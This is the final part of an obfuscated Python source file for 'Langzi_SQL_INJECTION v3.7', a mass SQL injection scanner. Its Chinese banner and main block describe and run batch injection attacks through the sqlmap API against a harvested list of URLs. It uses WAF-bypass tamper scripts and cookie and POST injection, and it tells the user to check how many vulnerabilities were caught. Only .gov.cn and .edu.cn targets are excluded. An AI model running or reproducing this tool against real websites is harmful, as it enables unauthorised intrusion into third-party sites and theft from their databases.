                                                 OO0OO000OO000O00O['title'])  # line:464
                if OO00OOOO0O0OO0O0O != None:  # line:465
                    return OO00OOOO0O0OO0O0O  # line:466
                O0O0O0OO00OOOOOOO = scan_level_3(OO0OO000OO000O00O['id_links'].replace(' ', ''),
                                                 OO0OO000OO000O00O['title'])  # line:467
                if O0O0O0OO00OOOOOOO != None:  # line:468
                    return O0O0O0OO00OOOOOOO  # line:469
                O00O000OOOOOO00O0 = scan_level_4(OO0OO000OO000O00O['id_links'].replace(' ', ''),
                                                 OO0OO000OO000O00O['title'])  # line:470
                if O00O000OOOOOO00O0 != None:  # line:471
                    return O00O000OOOOOO00O0  # line:472
                OOOO0O0OOOOOOO0OO = scan_level_5(OO0OO000OO000O00O['id_links'].replace(' ', ''),
                                                 OO0OO000OO000O00O['title'])  # line:473
                if OOOO0O0OOOOOOO0OO != None:  # line:474
                    return OOOO0O0OOOOOOO0OO  # line:475


if __name__ == '__main__':  # line:478
    multiprocessing.freeze_support()  # line:479
    print('''

             _                           _
            | |                         (_)
            | |     __ _ _ __   __ _ _____
            | |    / _` | '_ \ / _` |_  / |
            | |___| (_| | | | | (_| |/ /| |
            |______\__,_|_| |_|\__, /___|_|
                                __/ |      Langzi_SQL_INJECTION
                               |___/       Version:3.7
                                           Datetime:2019-03-09

    ''')  # line:492
    print('''

        Description:
            Langzi_SQL_INJECTION v3.7版本是一款批量检测SQL注入漏洞的自动化工具
            对采集导入网址根据设置扫描等级进行全自动化扫描检测生成漏洞报告
            通过SQLMAP提供的API实现批量注入检测，扫描结果可百分百完全复现
            支持伪静态注入，cookie注入，post注入，加载绕过WAF的Tamper检测注入
            适用与6-80岁年龄段人群使用，简单，便捷，批量，自动生成检测结果

        扫描等级:
            level 0 : 仅仅使用BOOL类型的盲注检测
            level 1 : 使用多种类型判断注入方式
            level 2 : 支持cookie注入与post注入方式
            level 3 : 调用目录下绕过安全狗Tamper脚本检测
            level 4 : 调用Tamper绕过WAF加测cookie注入与post注入
            level 5 : 加载时间延迟与Tamper高风险等级注入
            level 6 : 调用0-5所有级别进行注入，直到成功完成注入检测

        Tips:    
            无法对GOV-EDU进行检测
            在WIN 7 下不兼容运行
            运行目录不能存在中文字符

    ''')  # line:516
    time.sleep(8)  # line:517
    New_start = input(('把采集的url文本拖拽进来:'))  # line:518
    levels = int(input(('设置扫描等级(0/1/2/3/4/5/6):')))  # line:519
    countss = int(input(('设置扫描进程数(2-36):')))  # line:520
    p = multiprocessing.Pool(countss)  # line:521
    list_ = list(set([OOOOOOOO0000OOO00.replace('\n', '') if OOOOOOOO0000OOO00.startswith(
        'http') else 'http://' + OOOOOOOO0000OOO00.replace('\n', '') for OOOOOOOO0000OOO00 in
                      open(New_start, 'r').readlines()]))  # line:524
    for x in list_:  # line:525
        if 'gov.cn' in x:  # line:526
            sys.exit()  # line:527
        if 'edu.cn' in x:  # line:528
            sys.exit()  # line:529
    for x in list_:  # line:532
        p.apply_async(get_url_sql, args=(x, levels))  # line:534
    p.close()  # line:535
    p.join()  # line:536
    print('浪子哥哥提醒您，这次任务扫完了哦，快去看看抓到了几个漏洞吧~')  # line:537
    time.sleep(300)  # line:538
    time.sleep(300)  # line:539
    time.sleep(300)  # line:540
    time.sleep(300)  # line:541
    time.sleep(300)  # line:542
    time.sleep(300)  # line:543
    time.sleep(300)  # line:544
